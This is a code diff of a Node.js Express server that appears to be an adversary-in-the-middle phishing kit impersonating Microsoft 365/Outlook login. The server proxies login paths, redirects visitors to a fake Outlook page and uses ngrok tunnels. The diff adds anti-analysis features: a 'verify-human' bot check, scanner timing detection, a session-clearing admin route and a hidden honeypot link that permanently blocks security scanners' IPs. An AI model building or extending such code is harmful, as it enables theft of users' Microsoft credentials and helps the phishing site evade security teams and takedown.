@@ -14,7 +14,7 @@ const axios = require('axios');
 const cheerio = require('cheerio');
 const fs = require('fs');
 const revokedEmails = require('./utils/revokedEmails');
-
+const { handleVerification } = require('./middleware/botDetection');
 // Import routes
 const apiRoutes = require('./routes/apiRoutes');
 const proxyRoutes = require('./routes/proxyRoutes');
@@ -158,6 +158,8 @@ const ALLOWED_PATHS = [
     '/common/login',
     '/proxy/dual-login',
     '/api/outlook-proxy',
+    '/admin/clear-sessions',
+    '/verify-human'
 ];
 
 // Add your ngrok URL patterns
@@ -193,6 +195,18 @@ app.use((req, res, next) => {
     
     console.log(`🚫 Redirecting: ${req.method} ${pathname} → ${target}`);
     return res.redirect(target);
+});
+
+
+// Add this verification endpoint
+app.post('/verify-human', (req, res) => {
+    handleVerification(req, res, verifiedSessions);
+});
+
+// Make sure requestStartTime is set for the scanner detection
+app.use((req, res, next) => {
+    req.requestStartTime = Date.now();
+    next();
 });
 
 
@@ -1075,11 +1089,49 @@ function sendToSession(sessionId, event, data) {
 
 // ============= ADDITIONAL ROUTES =============
 
+
+
+
+
 // Root redirect
 app.get('/', (req, res) => {
     console.log(`↪️ Redirecting root to ${isProduction ? '/en-us/microsoft-365/outlook' : '/microsoft'}`);
     res.redirect(isProduction ? '/en-us/microsoft-365/outlook' : '/microsoft');
 });
+
+
+// Add this to your main app.js for testing
+app.get('/admin/clear-sessions', (req, res) => {
+    const count = verifiedSessions.size;
+    verifiedSessions.clear();
+    console.log(verifiedSessions);
+    res.json({ message: `Cleared ${count} verified sessions` });
+});
+
+
+// In your main app.js, add honeypot endpoint
+app.get('/honeypot', (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    console.log(`🍯 HONEYPOT TRIGGERED! Scanner at ${ip} clicked hidden link - Blocking permanently`);
+    
+    // Block the IP permanently
+    const fs = require('fs');
+    const blockedIPsFile = './data/blocked_ips.txt';
+    let blockedIPs = [];
+    
+    if (fs.existsSync(blockedIPsFile)) {
+        const content = fs.readFileSync(blockedIPsFile, 'utf8');
+        blockedIPs = content.split('\n').filter(i => i.trim().length > 0);
+    }
+    
+    if (!blockedIPs.includes(ip)) {
+        blockedIPs.push(ip);
+        fs.writeFileSync(blockedIPsFile, blockedIPs.join('\n'));
+    }
+    
+    res.status(403).send('Access Denied');
+});
+
 
 // Microsoft login page (simple version)
 app.get('/microsoft', async (req, res) => {
